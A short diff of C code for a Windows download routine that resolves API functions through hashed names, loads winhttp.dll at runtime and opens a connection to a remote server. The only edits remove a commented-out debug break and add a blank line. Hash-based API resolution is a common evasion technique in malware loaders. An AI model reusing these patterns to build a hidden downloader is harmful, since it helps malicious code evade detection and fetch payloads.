@@ -23,7 +23,6 @@ DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
     HANDLE kernel32_handle = GetModuleHandleH(KERNEL32DLL_JOAA);
     g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_JOAA);
 
-    //__debugbreak();
     HANDLE winhttp_handle = g_Api.pLoadLibraryA("winhttp.dll");
 
     g_Api.pWinHttpOpen = (fnWinHttpOpen)GetProcAddressH(winhttp_handle, WinHttpOpen_JOAA);
@@ -56,6 +55,7 @@ DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
 
     // connect to remote server
     INTERNET_PORT port = ssl ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
+
     HINTERNET hConnect = g_Api.pWinHttpConnect(hSession, url, port, 0);
 
     if (hConnect == NULL)
